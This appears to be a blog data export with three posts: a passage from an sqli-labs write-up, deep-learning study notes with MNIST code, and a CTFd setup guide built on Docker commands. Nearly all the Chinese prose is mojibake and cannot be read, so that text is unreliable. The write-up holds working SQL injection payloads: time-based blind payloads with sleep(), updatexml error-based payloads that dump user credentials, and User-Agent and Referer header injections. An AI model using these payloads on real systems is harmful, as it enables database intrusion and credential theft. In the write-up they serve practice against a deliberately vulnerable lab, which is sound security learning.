æ¥ä¸‹æ¥åªéœ€è¦å°†sleepå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ›¿æ¢ä¸ºpayloadï¼Œå³å¯æ ¹æ®ç½‘é¡µå“åº”æ—¶é—´åˆ¤æ–­ç»“æœ payloadå–ä¸Šè¿°ç›²æ³¨payloadçš„æŸ¥è¯¢éƒ¨åˆ† payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+ Less-10 å°†é—­åˆå‚æ•°çš„å•å¼•å·æ›¿æ¢ä¸ºåŒå¼•å·ï¼Œå…¶ä½™ä¸€è‡´ Less-11è¿™é“é¢˜æ˜¯ä½¿ç”¨postæ–¹å¼æäº¤æ•°æ®çš„ï¼Œåœ¨å¤šæ¬¡å°è¯•ä»¥åŠä¸Šç½‘æ‰¾èµ„æ–™ä¹‹åï¼Œå‘ç°æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ ä¸å¯ä»¥ç›´æ¥å°†urlç¼–ç ä¹‹åçš„æ•°æ®ï¼ˆå¦‚%20ï¼‰ç›´æ¥æäº¤ æœ€åçš„æ³¨é‡Šä¸å¯ä»¥ç”¨â€œâ€“+â€ï¼Œè€Œåº”è¯¥ç”¨â€œ#â€ ä¸Šé¢è¿™æ ·æ³¨é‡Šæ˜¯è¡Œä¸é€šçš„ï¼Œç”¨â€œ#â€ä»£æ›¿â€œâ€“+â€ä¹‹åå¦‚ä¸‹å›¾ ç„¶åå†ç”¨ä¹‹å‰å†™è¿‡çš„é¢˜å½“ä¸­å‡ºç°çš„è”åˆæ³¨å…¥ Less-12åŸç†åŒä¸Šä¸€é¢˜ä¸€è‡´ï¼Œå”¯ä¸€å·®åˆ«æ˜¯é—­åˆæ–¹å¼ä¸åŒ less-13è¿™é“é¢˜çš„é—­åˆæ–¹å¼ä¸ä¸Šä¸€é“é¢˜ç›®æ¯”è¾ƒç›¸ä¼¼ï¼Œåªä¸è¿‡æŠŠåŒå¼•å·æ›¿æ¢ä¸ºå•å¼•å·ï¼Œæ¯”è¾ƒä¸ä¸€æ ·çš„æ˜¯è¿™é“é¢˜ä¸å¯ä»¥ä½¿ç”¨ä¸Šä¸€é“é¢˜çš„è”åˆæ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå…·ä½“çš„payloadå¯å‚ç…§ä¸Šè¿°é¢˜ç›®æœ‰å…³æŠ¥é”™æ³¨å…¥çš„éƒ¨åˆ† ä¸‹å›¾æ˜¯è”åˆæ³¨å…¥åæ— å›æ˜¾çš„ç»“æœ è¿™é‡Œä½¿ç”¨äº†æŠ¥é”™æ³¨å…¥è¿”å›äº†mysqlçš„ç»å¯¹è·¯å¾„ payloadï¼š1â€™) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# è¿™é‡ŒæŸ¥è¯¢åˆ°äº†å½“å‰çš„æ•°æ®åº“ éœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¿”å›é•¿åº¦çš„é™åˆ¶ï¼Œå›æ˜¾æ— æ³•æ˜¾ç¤ºæ‰€æœ‰çš„ç»“æœï¼Œå¯ä»¥æ ¹æ®payloadä½œç›¸åº”è°ƒæ•´ payloadï¼š1â€™) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)# Less-14è¿™é“é¢˜ä¸ä¸Šä¸€é“é¢˜ç±»ä¼¼ï¼Œå”¯ä¸€ä¸åŒçš„ä»æ˜¯é—­åˆæ–¹å¼ä¸åŒ Less-15è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯postæ–¹å¼çš„åŸºäºæ—¶é—´çš„ç›²æ³¨ ä¸€å¼€å§‹ä¾ç„¶å…ˆåˆ¤æ–­é—­åˆæ–¹å¼ ç„¶åç”¨ifè¯­å¥æ„é€ åŸºäºæ—¶é—´çš„ç›²æ³¨ è¿™é‡Œæ— éœ€å…³æ³¨æ˜¯å¦ç™»å½•æˆåŠŸï¼Œåªéœ€å…³æ³¨å“åº”æ—¶é—´ ç„¶åæ ¹æ®ä¸Šè¿°é¢˜ç›®ä¸­æœ‰å…³åŸºäºæ—¶é—´çš„ç›²æ³¨æœ‰å…³çš„é¢˜ç›®çš„payloadè¿›è¡Œæ³¨å…¥ payloadï¼š1â€™ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=â€™câ€™),sleep(2),1) # Less-16è¿™é“é¢˜ä¸ä¸Šä¸€é“é¢˜ç›®å·®ä¸å¤šï¼Œå”¯ä¸€åŒºåˆ«ä»æ˜¯é—­åˆæ–¹å¼ä¸åŒ Less-17è¿™é“é¢˜æ¶‰åŠåˆ°äº†sqlè¯­å¥ä¸­updateéƒ¨åˆ†ï¼Œæ¨¡æ‹Ÿçš„æ˜¯åœ¨ç™»å½•æˆåŠŸåä¿®æ”¹å¯†ç æ—¶çš„æ³¨å…¥ è¿™é‡Œç”±äºæ— æ³•å›æ˜¾é—­åˆæ–¹å¼æ˜¯å¦æ­£ç¡®ï¼Œæ•…ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨ä¸­çš„å°æŠ€å·§è¿›è¡Œåˆ¤æ–­ å¾€ä¸‹çš„è¿‡ç¨‹æ¶‰åŠåˆ°å­æŸ¥è¯¢çš„æ¦‚å¿µï¼Œå³ä»¥æŸ¥è¯¢çš„ç»“æœä½œä¸ºä¸‹ä¸€æ¬¡æŸ¥è¯¢çš„èŒƒå›´ æŸ¥æ•°æ®åº“ å¾€ååªéœ€å°†select database()æ›¿æ¢ä¸ºå…ˆå‰é¢˜ç›®ä¸­ç›¸åº”çš„payloadå³å¯ Less-18ä¸€å¼€å§‹ç»™å‡ºäº†æœ¬æœºçš„ipåœ°å€ï¼Œæ„ä¹‰ä¸æ˜ï¼ˆä¼°è®¡æ˜¯æç¤ºå¯ä»¥æ³¨å…¥æŸäº›ç±»å‹çš„ä¿¡æ¯ä»¥æ‰§è¡Œï¼‰ å†ç»è¿‡å¯¹usernameå’Œpasswordçš„å¤šæ¬¡æ³¨å…¥åå‘ç°æ²¡æœ‰ä»€ä¹ˆæ•ˆæœï¼Œå°è¯•ç™»å½• å¯ä»¥çœ‹å‡ºç™»å½•åå›æ˜¾äº†user agentï¼Œåˆ™å¯ä»¥é€šè¿‡æŠ“åŒ…ä¿®æ”¹user agentçš„æ–¹å¼æ³¨å…¥ payloadï¼šâ€™and updatexml(1,concat(0x7e,database(),0x7e),1) or â€˜ Less-19è¿™é“é¢˜ä¸ä¸Šä¸€é“å·®ä¸å¤šï¼Œåªä¸è¿‡ä¿®æ”¹çš„æ˜¯Refererå­—æ®µ payloadï¼šä¸ä¸Šä¸€é“é¢˜ä¸€è‡´","categories":[],"tags":[{"name":"ctfã€web","slug":"ctfã€web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"}]},{"title":"Deep Learning from Scratch 2","slug":"deep_learning_from_scratch_2","date":"2021-11-29T14:46:25.122Z","updated":"2021-12-05T02:56:57.166Z","comments":true,"path":"2021/11/29/deep_learning_from_scratch_2/","link":"","permalink":"http://uniqueland.top/2021/11/29/deep_learning_from_scratch_2/","excerpt":"åœ¨â€æ‰‹å†™æ•°å­—è¯†åˆ«â€ä¸­","text":"åœ¨â€æ‰‹å†™æ•°å­—è¯†åˆ«â€ä¸­ äº†è§£åˆ°äº†mnistæ•°æ®é›† å¯¹è¿ç®—è¿‡ç¨‹ä¸­è¿ç®—çš„å…·ä½“å¯¹è±¡æœ‰ç‚¹é—®é¢˜ 1234567891011import sys, ossys.path.append(os.pardir)from dataset.mnist import load_mnist(x_train, t_train), (x_test, t_test) = load_mnist(flatten=True, normalize=False) #ä¸€å¼€å§‹ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ„æ€print(x_train.shape)print(t_train.shape)print(x_test.shape)print(t_test.shape) å¯¹äºä»£ç ä¸­å‡ºç°çš„ä¸¤ä¸ªå…ƒç»„ï¼Œä¸€å¼€å§‹ä¸çŸ¥é“ t_train t_test ä»£è¡¨ä»€ä¹ˆï¼Œåœ¨çº ç»“äº†ä¸€æ®µæ—¶é—´åç»ˆäºæ˜ç™½äº† x_train æ˜¯è®­ç»ƒç”¨çš„å›¾åƒæ•°æ® t_train æ˜¯è®­ç»ƒå›¾åƒçš„è§£ï¼Œå³æ¯ä¸ªå›¾åƒå¯¹åº”çš„æ•°å­— x_test æ˜¯ç”¨äºæµ‹è¯•çš„å›¾åƒæ•°æ® t_test æ˜¯æµ‹è¯•å›¾åƒçš„è§£ï¼Œå³æ¯ä¸ªå›¾åƒå¯¹åº”çš„æ•°å­— è®¤è¯†äº†æ­£è§„åŒ–ã€é¢„å¤„ç†å’Œ one-hot è¡¨ç¤ºæ³• æ­£è§„åŒ–æŒ‡çš„æ˜¯å°†æ•°æ®è¿›è¡Œè½¬åŒ–ï¼Œå¦‚å¯¹å›¾åƒçš„æ¯ä¸ªåƒç´ æ•°å€¼é™¤ä»¥256ï¼Œä½¿å…¶æ•°å€¼åœ¨0åˆ°1ä¹‹é—´ï¼Œæ–¹ä¾¿åç»­è¿ç®— é¢„å¤„ç†ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åœ¨è¿ç®—ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œè½¬æ¢ï¼Œå¦‚æ­£è§„åŒ–ç­‰ one-hot è¡¨ç¤ºæ³•æ˜¯æŒ‡å¯¹è¿ç®—ç»“æœåªå°† è§£ æ‰€å¯¹åº”çš„å€¼è®¾ä¸º1ï¼Œå³å°† è§£ ä½œä¸ºç´¢å¼•ï¼Œè®¾ç½®è¯¥ç´¢å¼•çš„å€¼ä¸º1ï¼›åœ¨å¯¹å›¾åƒè¿›è¡Œé¢„æµ‹çš„è„šæœ¬ä¸­ï¼Œè·å–è§£çš„è¿‡ç¨‹ä¾¿æ˜¯åŸºäºone-hotè¡¨ç¤ºæ³•çš„ï¼Œå¦‚ä¸‹ p= np.argmax(y) 12345for i in range(len(x)): y = predict(network, x[i]) p= np.argmax(y) # è·å–æ¦‚ç‡æœ€é«˜çš„å…ƒç´ çš„ç´¢å¼• if p == t[i]: accuracy_cnt += 1 å¦å¤–ï¼Œåœ¨é˜…è¯»åˆ°è®¾è®¡ç¥ç»ç½‘ç»œæ—¶ï¼Œå­¦åˆ°äº†æœ‰å…³è¾“å…¥å±‚å’Œè¾“å‡ºå±‚ä¸æ•°æ®ä¹‹é—´çš„å…³ç³» è¾“å…¥å±‚ä¸ºå¾…è®­ç»ƒæ•°æ®çš„å¤§å°ï¼Œå¦‚è®­ç»ƒæ‰‹å†™æ•°å­—è¯†åˆ«æ—¶è¾“å…¥å±‚ä¸º784ï¼Œå³ä¸ºè®­ç»ƒå›¾åƒçš„å¤§å° è¾“å‡ºå±‚ä¸ºåˆ†ç±»æ•°ç›®ï¼Œå¦‚è®­ç»ƒçš„æ‰‹å†™æ•°å­—ç»“æœåªæœ‰0åˆ°9åç§å¯èƒ½ï¼Œæ•…å°†è¾“å‡ºå±‚è®¾ä¸ºå åœ¨â€œä»æ•°æ®ä¸­å­¦ä¹ â€ä¸­ è®¤è¯†äº†è®¸å¤šæ¦‚å¿µ ç‰¹å¾é‡ ç‰¹å¾é‡æ˜¯æŒ‡å¯ä»¥ä»è¾“å…¥æ•°æ®ä¸­å‡†ç¡®åœ°æå–æœ¬è´¨æ•°æ®çš„è½¬æ¢å™¨ï¼Œé€šå¸¸è¡¨ç¤ºä¸ºå‘é‡å½¢å¼ ç‰¹å¾é‡æ˜¯ç”±äººè®¾è®¡çš„ ä¸åŒé—®é¢˜å¯¹åº”ä¸åŒç‰¹å¾é‡ æ·±åº¦å­¦ä¹ ä¸­ç‰¹å¾é‡æ˜¯ç”±æœºå™¨æ¥å­¦ä¹ çš„ æ³›åŒ–èƒ½åŠ› æ³›åŒ–èƒ½åŠ›æ˜¯æŒ‡å¤„ç†æœªè¢«è§‚å¯Ÿè¿‡çš„æ•°æ®ï¼ˆä¸åŒ…å«åœ¨è®­ç»ƒæ•°æ®ä¸­çš„æ•°æ®ï¼‰çš„èƒ½åŠ› è¿‡æ‹Ÿåˆ åªå¯¹æŸä¸ªæ•°æ®é›†è¿‡åº¦æ‹Ÿåˆçš„çŠ¶æ€ç§°ä¸ºè¿‡æ‹Ÿåˆ å¯ä»¥ç†è§£ä¸ºè®­ç»ƒçš„æ¨¡å‹åªå¯¹æŸä¸ªæ•°æ®é›†èµ·ä½œç”¨ æŸå¤±å‡½æ•° æŸå¤±å‡½æ•°æ˜¯è¡¨ç¤ºç¥ç»ç½‘ç»œæ€§èƒ½çš„â€œæ¶åŠ£ç¨‹åº¦â€çš„æŒ‡æ ‡ï¼Œå³å½“å‰çš„ç¥ç»ç½‘ç»œå¯¹ç›‘ç£æ•°æ®åœ¨å¤šå¤§ç¨‹åº¦ä¸Šä¸æ‹Ÿåˆï¼Œåœ¨å¤šå¤§ç¨‹åº¦ä¸Šä¸ä¸€è‡´ å‡æ–¹è¯¯å·®$$E=\\frac{1}{2}\\Sigma_k(y_k-t_k)^2$$ è¿™é‡Œy_kè¡¨ç¤ºç¥ç»ç½‘ç»œçš„è¾“å‡ºï¼Œt_kè¡¨ç¤ºç›‘ç£æ•°æ®ï¼Œkè¡¨ç¤ºæ•°æ®ç»´æ•° äº¤å‰ç†µè¯¯å·®$$E=-\\Sigma_kt_k\\log{y_k}$$ æŸå¤±å‡½æ•°çš„æ„ä¹‰ä¸ªäººè®¤ä¸ºï¼ŒæŸå¤±å‡½æ•°å­˜åœ¨çš„æ„ä¹‰æ˜¯ä½œä¸ºæ¨¡å‹è°ƒå‚ç»“æœçš„é‡è¦æŒ‡æ ‡ï¼Œç”±äºæµ‹è¯•ç²¾åº¦çš„å˜åŒ–æ˜¯ä¸è¿ç»­çš„ï¼ˆå› ä¸ºæµ‹è¯•æ•°æ®æœ‰é™ï¼Œæµ‹è¯•ç»“æœçš„ç²¾åº¦å°±å–å†³äºæµ‹è¯•æ•°æ®çš„å¤šå°‘ï¼‰ï¼Œæ•…æ— æ³•ä½“ç°æ¨¡å‹è°ƒå‚åå¾®å°çš„å˜åŒ–ï¼Œè€ŒæŸå¤±å‡½æ•°æ˜¯è¿ç»­çš„ï¼Œä»»ä½•å¾®å°çš„æ”¹åŠ¨éƒ½å¯èƒ½æ”¹å˜æŸå¤±å‡½æ•°çš„ç»“æœï¼ˆå¯ä»¥è®¤ä¸ºæŸå¤±å‡½æ•°çš„ç²¾åº¦æ¯”æµ‹è¯•ç»“æœçš„ç²¾åº¦é«˜å¾—å¤šï¼‰ï¼Œæ•…éœ€è¦æŸå¤±å‡½æ•°æ¥è¡¡é‡è°ƒå‚åçš„ç»“æœ æ•°å€¼å¾®åˆ† åˆ©ç”¨æŸä¸ªç»™å®šçš„å¾®å°å€¼çš„å·®åˆ†æ±‚å¯¼æ•°çš„è¿‡ç¨‹ï¼Œç§°ä¸ºæ•°å€¼å¾®åˆ† å¯¼æ•°ä¸åå¯¼æ•°çš„å®šä¹‰ æ¢¯åº¦åŠæ¢¯åº¦æ³• æ¢¯åº¦æ³•ï¼šå‡½æ•°çš„å–å€¼ä»å½“å‰ä½ç½®æ²¿ç€æ¢¯åº¦æ–¹å‘å‰è¿›ä¸€æ®µè·ç¦»ï¼Œç„¶ååœ¨æ–°çš„åœ°æ–¹é‡æ–°æ±‚æ¢¯åº¦ï¼Œå†æ²¿ç€æ–°æ¢¯åº¦æ–¹å‘å‰è¿›ï¼Œé€æ¸å‡å°å‡½æ•°å€¼ å­¦ä¹ ç®—æ³•ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰çš„å®ç°ç¥ç»ç½‘ç»œçš„å­¦ä¹ æ­¥éª¤ï¼š å‰æ ç¥ç»ç½‘ç»œå­˜åœ¨åˆé€‚çš„æƒé‡å’Œåç½®ï¼Œè°ƒæ•´æƒé‡å’Œåç½®ä»¥ä¾¿æ‹Ÿåˆè®­ç»ƒæ•°æ®çš„è¿‡ç¨‹ç§°ä¸ºâ€œå­¦ä¹ â€ æ­¥éª¤1ï¼ˆmini-batchï¼‰ ä»è®­ç»ƒæ•°æ®ä¸­éšæœºé€‰å‡ºä¸€éƒ¨åˆ†æ•°æ®ï¼Œè¿™éƒ¨åˆ†æ•°æ®ç§°ä¸ºmini-batchã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å‡å°mini-batchçš„æŸå¤±å‡½æ•°çš„å€¼ æ­¥éª¤2ï¼ˆè®¡ç®—æ¢¯åº¦ï¼‰ ä¸ºäº†å‡å°mini-batchçš„æŸå¤±å‡½æ•°çš„å€¼ï¼Œéœ€è¦æ±‚å‡ºå„ä¸ªæƒé‡å‚æ•°çš„æ¢¯åº¦ã€‚æ¢¯åº¦è¡¨ç¤ºæŸå¤±å‡½æ•°çš„å€¼å‡å°æœ€å¤šçš„æ–¹å‘ æ­¥éª¤3ï¼ˆæ›´æ–°å‚æ•°ï¼‰ å°†æƒé‡å‚æ•°æ²¿æ¢¯åº¦æ–¹å‘è¿›è¡Œå¾®å°æ›´æ–° æ­¥éª¤4ï¼ˆé‡å¤ï¼‰ é‡å¤æ­¥éª¤1ã€æ­¥éª¤2ã€æ­¥éª¤3 epochï¼š epochæ˜¯ä¸€ä¸ªå•ä½ï¼Œä¸€ä¸ªepochè¡¨ç¤ºå­¦ä¹ ä¸­æ‰€æœ‰è®­ç»ƒæ•°æ®å‡è¢«ä½¿ç”¨è¿‡ä¸€æ¬¡æ—¶çš„æ›´æ–°æ¬¡æ•° è¯¯å·®æ–¹å‘ä¼ æ’­æ³•è®¡ç®—å›¾äº†è§£æ­£å‘ä¼ æ’­ã€åå‘ä¼ æ’­åŠå±€éƒ¨è®¡ç®—çš„å®šä¹‰ é“¾å¼æ³•åˆ™å¤åˆå‡½æ•°å¯¼æ•°çš„å®šä¹‰ å¦‚æœæŸä¸ªå‡½æ•°ç”±å¤åˆå‡½æ•°è¡¨ç¤ºï¼Œåˆ™è¯¥å¤åˆå‡½æ•°çš„å¯¼æ•°å¯ä»¥ç”¨æ„æˆå¤åˆå‡½æ•°çš„å„ä¸ªå‡½æ•°çš„å¯¼æ•°çš„ä¹˜ç§¯è¡¨ç¤º é“¾å¼æ³•åˆ™æ˜¯å…³äºå¤åˆå‡½æ•°çš„å¯¼æ•°çš„æ€§è´¨ åå‘ä¼ æ’­åå‘ä¼ æ’­çš„è®¡ç®—é¡ºåº å…ˆå°†èŠ‚ç‚¹çš„è¾“å…¥ä¿¡å·ä¹˜ä»¥èŠ‚ç‚¹çš„å±€éƒ¨å¯¼æ•°ï¼ˆåå¯¼æ•°ï¼‰ï¼Œç„¶åä¼ é€’ç»™ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ åŠ æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­ åŠ æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­åªä¹˜ä»¥1 ä¹˜æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­ ä¹˜æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­ä¼šå°†ä¸Šæ¸¸çš„å€¼ä¹˜ä»¥æ­£å‘ä¼ æ’­æ—¶çš„è¾“å…¥ä¿¡å·çš„â€œç¿»è½¬å€¼â€åä¼ é€’ç»™ä¸‹æ¸¸ å¯¹ç¿»è½¬å€¼çš„ç†è§£ï¼šä¹¦ä¸Šè¯´çš„æ˜¯â€œè¡¨ç¤ºä¸€ç§ç¿»è½¬å…³ç³»â€ï¼Œä¸ªäººè®¤ä¸ºæ˜¯å‚ä¸è¿ç®—çš„å¦ä¸€ä¸ªå€¼ï¼Œä»¥ä¹˜æ³•ä¸ºä¾‹ï¼šä¹˜æ³•æ¶‰åŠåˆ°ä¸¤ä¸ªå€¼ï¼Œåˆ™ä¼ æ’­åˆ°æŸä¸€ä¸ªæ–¹å‘çš„å€¼ä¸ºä¸Šæ¸¸çš„å€¼ä¹˜ä»¥å‚ä¸è¿ç®—çš„å¦ä¸€ä¸ªå¯¹è±¡çš„å€¼","categories":[],"tags":[{"name":"çŸ¥è¯†è¾“å‡ºã€AI","slug":"çŸ¥è¯†è¾“å‡ºã€AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"CTFdæ­å»º","slug":"ctf_contest_platform_build","date":"2021-11-28T09:32:15.439Z","updated":"2021-11-28T09:35:07.152Z","comments":true,"path":"2021/11/28/ctf_contest_platform_build/","link":"","permalink":"http://uniqueland.top/2021/11/28/ctf_contest_platform_build/","excerpt":"CTFæ¯”èµ›å¹³å°æ­å»º","text":"CTFæ¯”èµ›å¹³å°æ­å»º å…‹éš†CTFdGitHubï¼šhttps://github.com/CTFd/CTFd 123456789â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html]â””â”€$ sudo git clone https://github.com/CTFd/CTFd.git 128 â¨¯Cloning into &#x27;CTFd&#x27;...remote: Enumerating objects: 14012, done.remote: Counting objects: 100% (869/869), done.remote: Compressing objects: 100% (555/555), done.remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, done.Resolving deltas: 100% (8691/8691), done. å®‰è£…docker12â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]â””â”€$ sudo apt install docker docker-compose 1234567â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]â””â”€$ docker --versionDocker version 20.10.8+dfsg1, build 3967b7d â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]â””â”€$ docker-compose --versiondocker-compose version 1.27.4, build unknown æ·»åŠ æ‰§è¡Œæƒé™12â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]â””â”€$ sudo chmod +x /usr/bin/docker-compose åœ¨CTFdæ ¹ç›®å½•ä¸‹å¯åŠ¨docker123456789101112131415161718192021â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]â””â”€$ sudo docker-compose up -d 130 â¨¯Creating network &quot;ctfd_internal&quot; with the default driverCreating network &quot;ctfd_default&quot; with the default driverPulling db (mariadb:10.4.12)...10.4.12: Pulling from library/mariadb23884877105a: Pull completebc38caa0f5b9: Pull complete2910811b6c42: Pull complete36505266dcc6: Pull completee69dcc78e96e: Pull complete222f44c5392d: Pull completeefc64ea97b9c: Pull complete9912a149de6b: Pull complete7ef6cf5b5697: Pull complete8a05be3688e0: Pull completec09ffdc1b660: Pull complete2eb7fe288fc8: Pull completeb41d1cc4d40f: Pull completea92376500910: Pull complete...... æ³¨ï¼šé¦–æ¬¡å¯åŠ¨ç”±äºä¸‹è½½ä¾èµ–ç­‰ä¼šæ¯”è¾ƒæ…¢ å¹³å°é…ç½®æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥127.0.0.1:8000é…ç½®èµ›äº‹ç›¸å…³ä¿¡æ¯ æ·»åŠ é¢˜ç›®åœ¨GitHubä¸Šæ‰¾é¢˜ç›®ï¼Œcloneåˆ°æœ¬åœ° 1234567â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd/ctf_training]â””â”€$ sudo git clone https://github.com/CTFTraining/CTFTraining.gitCloning into &#x27;CTFTraining&#x27;...remote: Enumerating objects: 86, done.remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, done.Resolving deltas: 100% (48/48), done. å®é™…æµ‹è¯•å‘ç°ä¸èƒ½æŠŠæ‰€æœ‰çš„é¢˜ç›®éƒ½cloneä¸‹æ¥ï¼Œå°±å…ˆè¯•ä¸€é“é¢˜ 1234567â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd/ctf_training]â””â”€$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 â¨¯Cloning into &#x27;0ctf_2016_unserialize&#x27;...remote: Enumerating objects: 32, done.remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, done.Resolving deltas: 100% (3/3), done. docker images å‘½ä»¤æŸ¥çœ‹å·²æœ‰é•œåƒ docker build ./ -t [é•œåƒåç§°] å¯åŠ¨Dockerfileæ–‡ä»¶ï¼Œåˆ›å»ºé•œåƒ 12345678910111213141516â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]â””â”€$ sudo docker build ./ -t 0ctf_2016_unserialize Sending build context to Docker daemon 1.841MBStep 1/8 : FROM php:5.6-fpm-alpine5.6-fpm-alpine: Pulling from library/php169185f82c45: Pull complete 8ba0d98519aa: Pull complete 75f762bbc102: Pull complete 04f939cd9fe5: Pull complete 5feedbe48aa1: Pull complete 47e0f87348c0: Pull complete 68b7fb9d3c14: Pull complete 7e4b086d6b5d: Pull complete a15e624700d4: Pull complete f714654cc532: Pull complete Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b 123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]â””â”€$ sudo docker images 1 â¨¯REPOSITORY TAG IMAGE ID CREATED SIZE0ctf_2016_unserialize latest 931233916db0 2 minutes ago 333MBctfd_ctfd latest b36ee26f2439 49 minutes ago 791MBpython 3.7-slim-buster cd7d26aa86ac 10 days ago 113MBnginx 1.17 9beeba249f3e 18 months ago 127MBmariadb 10.4.12 b6184b68d1fd 19 months ago 357MBredis 4 191c4017dcdd 19 months ago 89.3MBubuntu 18.10 9dc19675e327 2 years ago 67.3MBphp 5.6-fpm-alpine 6feac8f2ef42 2 years ago 54.5MBphp 5-apache-jessie d34f09f63596 2 years ago 374MB å†é€šè¿‡é•œåƒåˆ›å»ºå®¹å™¨ï¼š 12â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]â””â”€$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize æŸ¥çœ‹ç°æœ‰å®¹å™¨ï¼š 12345678â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]â””â”€$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9cae78cf79bc 0ctf_2016_unserialize &quot;docker-php-entrypoiâ€¦&quot; 5 seconds ago Up 4 seconds 9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp 0ctf_2016_unserialize3b3889db12c7 nginx:1.17 &quot;nginx -g &#x27;daemon ofâ€¦&quot; 57 minutes ago Up 57 minutes 0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp ctfd_nginx_17b58b9661715 ctfd_ctfd &quot;/opt/CTFd/docker-enâ€¦&quot; 57 minutes ago Up 57 minutes 0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp ctfd_ctfd_193e49564bff7 mariadb:10.4.12 &quot;docker-entrypoint.sâ€¦&quot; 57 minutes ago Up 57 minutes ctfd_db_19f4380eb4639 redis:4 &quot;docker-entrypoint.sâ€¦&quot; 57 minutes ago Up 57 minutes è®¿é—®127.0.0.1:20000å³å¯è®¿é—®åˆ°åˆšåˆšæ·»åŠ çš„é¢˜ç›®ï¼Œ20000æ˜¯åˆšåˆšæŒ‡å®šçš„ç«¯å£ æ‰“å¼€é¢˜ç›®å®¹å™¨ï¼š 1docker exec -i -t &lt;container&gt; /bin/sh ä¸ºé¢˜ç›®æ·»åŠ flagï¼š 1234567â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]â””â”€$ sudo docker exec -i -t 0ctf_2016_unserialize /bin/sh 1 â¨¯/var/www/html # lsclass.php config.php index.php profile.php register.php static update.php upload www.zip/var/www/html # echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt/var/www/html # lsclass.php config.php flag.txt index.php profile.php register.php static update.php upload www.zip æœ€ååœ¨åå°æ·»åŠ é¢˜ç›®åœ°å€ç­‰ä¿¡æ¯ åŒç†å¯æ·»åŠ å…¶ä»–é¢˜ç›® æ­å»ºä¸­é‡åˆ°çš„é—®é¢˜ git clone å‘½ä»¤å…‹éš†å¤±è´¥ï¼š 1234â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd/ctf_training]â””â”€$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 â¨¯Cloning into &#x27;0ctf_2016_unserialize&#x27;...fatal: unable to access &#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;: Failed to connect to github.com port 443: Connection refused ç”±äºç½‘ç»œé—®é¢˜ï¼Œå¯èƒ½éœ€è¦å¤šå…‹éš†å‡ æ¬¡ï¼Œå®åœ¨ä¸è¡Œå¯ä»¥è¯•è¯•æŠŠå‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥ æœ‰äº›é¢˜ç›®å…‹éš†ä¸‹æ¥å¯èƒ½æœ‰é—®é¢˜ï¼Œè¿è¡Œè¿‡ç¨‹ä¸­å¯èƒ½ä¼šæŠ¥é”™ï¼ˆç›®å‰ä»ä¸äº†è§£æ˜¯ä»€ä¹ˆåŸå› ï¼‰ 